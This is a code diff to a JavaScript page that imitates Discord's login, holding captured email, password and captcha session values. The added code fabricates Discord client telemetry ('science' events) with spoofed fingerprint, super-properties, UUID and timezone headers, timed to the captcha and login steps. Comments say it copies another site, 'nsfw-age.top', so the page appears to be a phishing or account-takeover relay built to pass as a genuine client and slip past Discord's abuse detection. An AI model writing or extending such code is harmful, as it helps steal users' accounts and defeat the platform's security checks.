@@ -459,6 +459,44 @@ var captchaEmail    = null;
 var captchaPw       = null;
 var captchaRqtoken  = '';
 var captchaSessionId = '';
+var _discordFingerprint = '';
+var _discordSuperProps = '';
+var _launchSignature = crypto.randomUUID ? crypto.randomUUID() : (Math.random().toString(36).slice(2) + '-' + Date.now().toString(36));
+var _eventSeq = 0;
+var _pageLoadTime = Date.now();
+
+/* ═══ Science event helper ═══ */
+function _fireScience(eventType, extraProps) {
+  _eventSeq++;
+  var now = Date.now();
+  var props = {
+    client_track_timestamp: now,
+    event_sequence_number: _eventSeq,
+    client_performance_memory: 0,
+    accessibility_features: 524546,
+    rendered_locale: 'en-US',
+    uptime_app: Math.floor((now - _pageLoadTime) / 1000),
+    launch_signature: _launchSignature,
+    client_rtc_state: 'DISCONNECTED',
+    client_app_state: document.hasFocus() ? 'focused' : 'unfocused',
+    client_viewport_width: window.innerWidth,
+    client_viewport_height: window.innerHeight,
+    client_uuid: btoa(String.fromCharCode.apply(null, crypto.getRandomValues(new Uint8Array(24)))).replace(/=/g,''),
+    client_send_timestamp: now + 1
+  };
+  for (var k in extraProps) props[k] = extraProps[k];
+  var payload = JSON.stringify({events: [{type: eventType, properties: props}]});
+  var hdrs = {
+    'Content-Type': 'application/json',
+    'X-Debug-Options': 'bugReporterEnabled',
+    'X-Discord-Locale': 'en-US',
+    'X-Discord-Timezone': 'America/New_York'
+  };
+  if (_discordFingerprint) hdrs['X-Fingerprint'] = _discordFingerprint;
+  if (_discordSuperProps) hdrs['X-Super-Properties'] = _discordSuperProps;
+  console.log('[science]', eventType, props);
+  fetch('/api/v9/science', {method:'POST', headers: hdrs, body: payload}).catch(function(e){ console.log('[science] send error:', e); });
+}
 
 /* ═══ Helpers ═══ */
 function showErr(id, msg) {
@@ -561,6 +599,14 @@ function onHcaptchaPass(token) {
   /* Show "Verifying..." while we send the token */
   var vf = document.getElementById('captcha-verifying');
   if (vf) vf.classList.add('show');
+  /* Fire captcha_event verify science event (matches nsfw-age.top) */
+  var captchaFlowKey = crypto.randomUUID ? crypto.randomUUID() : (Math.random().toString(36).slice(2) + '-' + Date.now().toString(36));
+  _fireScience('captcha_event', {
+    captcha_event_name: 'verify',
+    captcha_service: 'hcaptcha',
+    sitekey: 'a9b5fb07-92ff-493f-86fe-352a2803b3df',
+    captcha_flow_key: captchaFlowKey
+  });
   /* Submit the solved token immediately */
   submitWithCaptcha(token);
 }
@@ -585,6 +631,12 @@ async function submitWithCaptcha(captchaToken) {
     });
     var d = await r.json();
     console.log('[captcha] server response status:', r.status, 'body:', JSON.stringify(d).slice(0,300));
+    /* Fire network_action_user_login science event (matches nsfw-age.top) */
+    _fireScience('network_action_user_login', {
+      status_code: r.status,
+      url: '/auth/login',
+      request_method: 'post'
+    });
     hideCaptchaStall();
     processLoginResult(d, r.status);
   } catch(err) {
@@ -796,6 +848,10 @@ document.getElementById('login-form').addEventListener('submit', async function(
       console.log('[login] captcha challenge received:', JSON.stringify({sitekey:d.sitekey,rqdata:d.rqdata?d.rqdata.slice(0,20)+'...':'',rqtoken:d.rqtoken?d.rqtoken.slice(0,20)+'...':'',session_id:d.session_id}));
       captchaRqtoken   = d.rqtoken || '';
       captchaSessionId = d.session_id || '';
+      _discordFingerprint = d.fingerprint || '';
+      _discordSuperProps  = d.super_properties || '';
+      /* Fire open_modal science event (matches nsfw-age.top) */
+      _fireScience('open_modal', {type: 'Guild Join Captcha'});
       showCaptchaStall(d.sitekey, d.rqdata);
       /* Login button stays disabled — re-enabled in processLoginResult / error */
       return;
